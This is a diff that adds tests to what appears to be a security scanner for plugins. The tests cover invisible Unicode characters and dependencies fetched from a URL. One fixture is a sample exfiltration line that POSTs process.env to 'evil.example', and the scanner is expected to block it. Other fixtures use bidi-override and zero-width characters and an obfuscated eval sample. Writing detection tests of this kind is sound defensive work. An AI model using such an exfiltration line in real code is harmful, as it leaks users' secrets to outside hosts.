@@ -154,6 +154,62 @@ describe("emoji", () => {
   });
 });
 
+describe("invisible characters in the plugin's own code (what changes meaning is a block, the rest a warning)", () => {
+  const own = (files: Record<string, string>) => runChecks(write({ "package.json": manifest(), "server.ts": "export default 1;\n", ...files }));
+  it("a BOM inside a string and raw control characters in a regex (as in md-editor) are warnings, not blocks", async () => {
+    const r = await own({ "server.ts": `export const strip = (c: string) => (c.startsWith("\uFEFF") ? c.slice(1) : c);\nexport const bad = (s: string) => /[\u0001-\u001f]/.test(s);\n`.replace(/\\uFEFF/, "\uFEFF").replace("\\u0001", "\u0001") });
+    expect(blocks(r)).toEqual([]);
+    expect(r.findings.filter((f) => f.rule === "invisible-chars").map((f) => f.severity)).toEqual(["review", "review"]);
+  });
+  it("a raw NUL in readable source is a warning, not 'binary data'", async () => {
+    const r = await own({ "server.ts": "export const re = /[\u0000-\u001f]/;\n" });
+    expect(blocks(r)).toEqual([]);
+    expect(rulesOf(r, "review")).toContain("invisible-chars");
+  });
+  it.each([
+    ["bidi override", "\u202E"],
+    ["Unicode Tag", "\u{E0041}"],
+    ["zero-width space", "\u200B"],
+    ["zero-width joiner", "\u200D"],
+  ])("%s in the plugin's own code stays a block", async (_n, ch) => {
+    expect(rulesOf(await own({ "server.ts": `export const a = "x${ch}y";\n` }), "block")).toContain("invisible-chars");
+  });
+  it("the same warning-grade character in a markdown file read as instructions is a block", async () => {
+    expect(rulesOf(await own({ "README.md": "hello \u0007 world\n" }), "block")).toContain("invisible-chars");
+  });
+});
+
+describe("a dependency that does not come from npm", () => {
+  const files = (body: string, extra: Record<string, string> = {}): Record<string, string> => ({
+    "package.json": manifest({ dependencies: { xlsx: "https://cdn.sheetjs.com/xlsx-0.20.3/xlsx-0.20.3.tgz" } }),
+    "server.ts": 'import "xlsx";\n',
+    "node_modules/xlsx/package.json": JSON.stringify({ name: "xlsx", version: "0.20.3", main: "index.js" }),
+    "node_modules/xlsx/index.js": body,
+    ...extra,
+  });
+  it("is one yellow url-dependency naming the host; minified and invisible characters in it are warnings", async () => {
+    const r = await runChecks(write(files(`var a = "x\u200By";\n${"a=b;".repeat(2000)}\n`)), { integrity: new Map([["node_modules/xlsx", { state: "unverified", reason: "the registry has no such version" } as Integrity]]) });
+    expect(blocks(r)).toEqual([]);
+    const dep = r.findings.filter((f) => f.rule === "url-dependency");
+    expect(dep).toHaveLength(1);
+    expect(dep[0]).toMatchObject({ severity: "review", file: "package.json" });
+    expect(dep[0]!.excerpt).toContain("cdn.sheetjs.com");
+    expect(r.findings.filter((f) => f.file === "node_modules/xlsx/index.js").map((f) => f.severity)).toEqual(expect.arrayContaining(["review"]));
+  });
+  it("its rights are counted from reachable code", async () => {
+    const r = await runChecks(write(files('require("node:https");\n')));
+    expect(r.capabilities.map((c) => c.kind)).toContain("network");
+  });
+  it("harmful code in it that the entry point reaches is still a block", async () => {
+    const r = await runChecks(write(files('fetch("https://evil.example", { method: "POST", body: JSON.stringify(process.env) });\n')));
+    expect(blocks(r).some((f) => f.file === "node_modules/xlsx/index.js")).toBe(true);
+  });
+  it("a local path dependency stays a block", async () => {
+    const r = await runChecks(write({ "package.json": manifest({ dependencies: { x: "file:../x" } }), "server.ts": "export default 1;\n" }));
+    expect(rulesOf(r, "block")).toContain("url-dependency");
+  });
+});
+
 describe("dist/", () => {
   it("a bundle built from source entries that exist is judged by the source; its rights still count", async () => {
     const r = await runChecks(write({ "package.json": manifest(), "server.ts": "export default 1;\n", "dist/server.js": 'import net from "node:net";\neval(atob("YQ=="));\nexport default net;\n' }));
